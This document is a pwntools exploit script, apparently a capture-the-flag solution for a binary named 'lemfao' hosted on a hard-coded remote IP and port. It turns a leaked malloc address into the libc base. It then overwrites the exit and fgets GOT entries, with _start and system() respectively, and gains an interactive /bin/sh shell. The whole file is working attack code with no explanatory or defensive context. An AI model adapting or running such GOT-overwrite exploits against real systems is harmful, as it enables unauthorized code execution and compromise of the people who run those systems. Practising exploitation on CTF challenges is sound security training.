#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './lemfao'
elf = context.binary = ELF(exe, checksec=True)
libc = 'libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '103.152.242.68', 10024

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+156
break *main+197
break *main+229
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    leak = io.recvuntil(b'0x')
    leak = int(io.recvline(), 16)
    log.info("Malloc leak addr: %#x", leak)

    libc.address = leak - libc.sym['malloc']
    log.info("Libc base: %#x", libc.address)

    system = libc.sym['system']
    log.info("System addr: %#x", system)

    got_fgets = elf.got['fgets']
    log.info("GOT Fgets addr: %#x", got_fgets)

    payload = b'/bin/sh\x00'
    io.sendlineafter(b'lemfao', payload)

    # do ret2start to execute fgets, but with overwritten got entry with system
    exit_addr = elf.got['exit']
    start_addr = elf.sym['_start']
    io.sendlineafter(b'hm', f'{exit_addr}'.encode())
    io.sendlineafter(b'huh', f'{start_addr}'.encode())

    io.sendlineafter(b'hm', f'{got_fgets}'.encode())
    io.sendlineafter(b'huh', f'{system}'.encode())

    io.interactive()
    
if __name__ == '__main__':
    exploit()